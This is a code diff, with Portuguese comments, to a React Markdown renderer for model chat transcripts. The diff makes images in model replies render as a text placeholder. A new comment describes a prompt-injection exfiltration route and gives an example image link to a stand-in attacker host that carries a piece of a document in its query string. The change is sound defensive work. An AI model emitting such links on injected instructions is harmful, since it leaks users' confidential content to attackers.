@@ -7,7 +7,7 @@
  * vira ruído no meio da frase e a enumeração — que na NSCA 5-3 é item, alínea e subalínea —
  * perde a hierarquia que a resposta tinha.
  *
- * Três decisões que não são estética:
+ * Quatro decisões que não são estética:
  *
  * 1. **`rehypeSanitize` é obrigatório.** O texto vem do modelo, e o modelo repete o que o
  *    usuário mandou: é entrada não confiável virando HTML. Sem o sanitizador, um `<img
@@ -18,6 +18,11 @@
  * 3. **`memo` por bloco.** Durante o stream o estado do chat muda a cada delta e re-renderiza
  *    a transcrição toda; sem isto, as mensagens ANTERIORES — já fechadas — seriam reparseadas
  *    a cada token da mensagem em curso.
+ * 4. **Imagem não carrega.** O sanitizador deixa `![](https://…)` passar — é Markdown
+ *    válido —, e o navegador busca a URL sozinho, sem clique. Um texto injetado no
+ *    documento (ou colado na conversa) que convença o modelo a responder
+ *    `![](https://atacante/?d=<trecho do ofício>)` exfiltra o conteúdo pela própria
+ *    requisição da imagem. Nenhuma resposta de modelo aqui precisa de imagem: vira texto.
  *
  * Duas alternativas prontas foram medidas antes desta, e as duas perdem AQUI:
  *
@@ -45,6 +50,14 @@ import remarkGfm from "remark-gfm"
 const remarkPlugins = [remarkGfm, remarkBreaks]
 const rehypePlugins = [rehypeSanitize]
 
+/**
+ * Imagem em resposta de modelo vira o texto alternativo — nunca uma requisição. Exportado
+ * porque toda transcrição de modelo no portal (inclusive a do chatRada) precisa dele.
+ */
+export function ModelImagePlaceholder({ alt }: { alt?: string }) {
+	return <span className="text-muted-foreground italic">[imagem{alt ? `: ${alt}` : ""}]</span>
+}
+
 /** Escala de conversa: menor que a da página legal e sem margem sobrando no fim do balão. */
 const components: Partial<Components> = {
 	p: ({ children }) => <p className="text-sm leading-relaxed mb-2 last:mb-0">{children}</p>,
@@ -67,6 +80,7 @@ const components: Partial<Components> = {
 	pre: ({ children }) => <pre className="bg-muted p-2 my-2 overflow-x-auto text-xs">{children}</pre>,
 	blockquote: ({ children }) => <blockquote className="border-l-2 border-border pl-3 my-2 italic">{children}</blockquote>,
 	hr: () => <hr className="border-border my-3" />,
+	img: ({ alt }) => <ModelImagePlaceholder alt={alt} />,
 	table: ({ children }) => (
 		<div className="my-2 overflow-x-auto border border-border">
 			<table className="w-full border-collapse text-xs">{children}</table>
